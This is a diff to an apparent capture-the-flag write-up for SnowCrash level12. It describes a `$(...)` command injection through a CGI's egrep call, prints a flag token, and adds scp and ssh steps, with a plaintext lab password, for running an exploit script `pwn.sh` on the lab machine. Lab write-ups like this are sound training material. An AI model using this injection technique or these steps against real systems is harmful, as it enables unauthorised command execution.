@@ -64,4 +64,13 @@ $ cat /tmp/l12
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
 
-`egrep` gets a nonsense pattern and the CGI prints its usual `..`, but `$(...)` already ran our script as flag12. `pwn.sh` in this folder does all of it.
+`egrep` gets a nonsense pattern and the CGI prints its usual `..`, but `$(...)` already ran our script as flag12.
+
+`pwn.sh` in this folder does all of it. It curls the CGI on the target's loopback, so run it there, from the toolbox:
+
+```bash
+scp -P 4242 ~/snowcrash/level12/resources/pwn.sh level12@10.0.2.2:/tmp/
+ssh -p 4242 level12@10.0.2.2        # password: fa6v5ateaw21peobuub8ipe6s
+# then on the target:
+$ sh /tmp/pwn.sh
+```
